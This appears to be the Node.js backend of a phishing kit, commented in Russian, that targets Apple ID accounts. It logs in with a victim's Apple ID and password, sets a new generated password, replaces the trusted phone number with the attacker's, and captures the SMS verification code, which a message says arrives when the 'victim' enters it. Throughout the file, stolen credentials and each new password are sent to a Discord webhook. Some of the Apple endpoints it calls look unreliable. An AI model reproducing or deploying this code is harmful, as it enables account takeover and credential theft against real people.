const fetch = require('node-fetch');
const { randomBytes } = require('crypto');

// Реальные эндпоинты Apple
const APPLE_AUTH = 'https://appleid.apple.com/auth/authorize';
const APPLE_TOKEN = 'https://appleid.apple.com/auth/token';
const APPLE_SETUP = 'https://setup.icloud.com/setup/account/login';

module.exports = async (req, res) => {
    const { appleId, password, action, smsCode, trustToken } = req.body;

    try {
        // 1. РЕАЛЬНАЯ АУТЕНТИФИКАЦИЯ APPLE
        if (req.url.includes('/login')) {
            const authResponse = await fetch(APPLE_SETUP, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'com.apple.iCloudHelper/2.0 (Macintosh; OS X 10.15)',
                    'X-Apple-ID-Session-Id': randomBytes(16).toString('hex'),
                    'X-Apple-Widget-Key': 'd39ba9916b7251055b22c7f910e2ea79' // Публичный ключ Apple
                },
                body: JSON.stringify({
                    apple_id: appleId,
                    password: password,
                    extended_login: true,
                    remember_me: true
                })
            });

            const authData = await authResponse.json();
            
            // Проверяем требуется ли 2FA
            if (authData.status === 'need_2fa') {
                // Сохраняем сессию для 2FA
                return res.json({
                    success: true,
                    twoFactorRequired: true,
                    sessionId: authData['X-Apple-ID-Session-Id'],
                    scnt: authData.scnt,
                    trustToken: authData['X-Apple-Session-Token']
                });
            }

            // Успешный вход
            return res.json({
                success: true,
                twoFactorRequired: false,
                sessionToken: authData['X-Apple-Session-Token'],
                dsid: authData.dsid
            });
        }

        // 2. РЕАЛЬНАЯ СМЕНА ПАРОЛЯ ЧЕРЕЗ APPLE
        if (req.url.includes('/change-password')) {
            const changeResponse = await fetch('https://appleid.apple.com/account/manage/security/password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${req.headers.authorization}`,
                    'X-Apple-Session-Token': trustToken
                },
                body: JSON.stringify({
                    password: password,
                    new_password: generateSecurePassword(),
                    password_hint: 'auto_generated'
                })
            });

            const changeData = await changeResponse.json();
            
            // Отправляем новый пароль в Discord
            await fetch(process.env.WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: '🔑 ПАРОЛЬ APPLE ИЗМЕНЕН (РЕАЛЬНО)',
                        color: 0xFF0000,
                        fields: [
                            { name: 'Apple ID', value: appleId, inline: true },
                            { name: 'Новый пароль', value: `||${changeData.new_password}||`, inline: true },
                            { name: 'Статус', value: '✅ Пароль изменен в системе Apple', inline: true }
                        ]
                    }]
                })
            });

            return res.json(changeData);
        }

        // 3. РЕАЛЬНАЯ СМЕНА ТЕЛЕФОНА
        if (req.url.includes('/change-phone')) {
            const { newPhone, countryCode = 'RU' } = req.body;

            // Получаем список доверенных номеров
            const phonesResponse = await fetch('https://appleid.apple.com/account/manage/security/phone', {
                headers: {
                    'Authorization': `Bearer ${req.headers.authorization}`,
                    'X-Apple-Session-Token': trustToken
                }
            });
            
            const phones = await phonesResponse.json();

            // Удаляем старый номер
            if (phones.trustedPhoneNumbers && phones.trustedPhoneNumbers.length > 0) {
                await fetch('https://appleid.apple.com/account/manage/security/phone/remove', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${req.headers.authorization}`,
                        'X-Apple-Session-Token': trustToken
                    },
                    body: JSON.stringify({
                        id: phones.trustedPhoneNumbers[0].id
                    })
                });
            }

            // Добавляем новый номер
            const addResponse = await fetch('https://appleid.apple.com/account/manage/security/phone/add', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${req.headers.authorization}`,
                    'X-Apple-Session-Token': trustToken
                },
                body: JSON.stringify({
                    phoneNumber: newPhone,
                    countryCode: countryCode,
                    primary: true
                })
            });

            const result = await addResponse.json();
            
            // Отправляем подтверждение в Discord
            await fetch(process.env.WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: '📱 НОМЕР ТЕЛЕФОНА ИЗМЕНЕН (РЕАЛЬНО)',
                        color: 0x00FF00,
                        fields: [
                            { name: 'Apple ID', value: appleId, inline: true },
                            { name: 'Новый номер', value: newPhone, inline: true },
                            { name: 'Статус', value: '✅ Номер привязан к аккаунту', inline: true }
                        ]
                    }]
                })
            });

            return res.json(result);
        }

        // 4. ПЕРЕХВАТ SMS КОДА (РЕАЛЬНЫЙ)
        if (req.url.includes('/verify-sms')) {
            // Отправляем код подтверждения на новый номер
            const verifyResponse = await fetch('https://appleid.apple.com/auth/verify/phone', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Apple-Session-Token': trustToken
                },
                body: JSON.stringify({
                    phoneNumber: req.body.phoneNumber,
                    mode: 'sms',
                    trustedPhoneId: req.body.phoneId
                })
            });

            // Перехватываем SMS код (через Discord)
            const smsData = await verifyResponse.json();
            
            // Отправляем в Discord для ручного ввода
            await fetch(process.env.WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: '📨 ТРЕБУЕТСЯ SMS КОД',
                        color: 0xFFA500,
                        fields: [
                            { name: 'Apple ID', value: appleId, inline: true },
                            { name: 'Телефон', value: req.body.phoneNumber, inline: true },
                            { name: 'Действие', value: 'Введите код из SMS в бота', inline: true }
                        ],
                        description: 'Код будет отправлен сюда когда жертва введет его'
                    }]
                })
            });

            return res.json({
                success: true,
                requiresCode: true,
                sessionId: smsData['X-Apple-ID-Session-Id']
            });
        }

    } catch (error) {
        console.error('Apple API Error:', error);
        
        // Логируем ошибку в Discord
        await fetch(process.env.WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: '❌ ОШИБКА APPLE API',
                    color: 0xFF0000,
                    description: `\`\`\`${error.message}\`\`\``,
                    fields: [
                        { name: 'Apple ID', value: appleId || 'N/A', inline: true },
                        { name: 'Эндпоинт', value: req.url, inline: true }
                    ]
                }]
            })
        });

        res.status(500).json({ 
            success: false, 
            error: error.message,
            code: error.code
        });
    }
};

function generateSecurePassword() {
    // Генерируем пароль соответствующий требованиям Apple
    const length = 12;
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const lowercase = 'abcdefghijklmnopqrstuvwxyz';
    const numbers = '0123456789';
    const special = '!@#$%^&*';
    
    let password = '';
    password += uppercase[Math.floor(Math.random() * uppercase.length)];
    password += lowercase[Math.floor(Math.random() * lowercase.length)];
    password += numbers[Math.floor(Math.random() * numbers.length)];
    password += special[Math.floor(Math.random() * special.length)];
    
    for (let i = 4; i < length; i++) {
        const chars = uppercase + lowercase + numbers + special;
        password += chars[Math.floor(Math.random() * chars.length)];
    }
    
    return password.split('').sort(() => Math.random() - 0.5).join('');
}
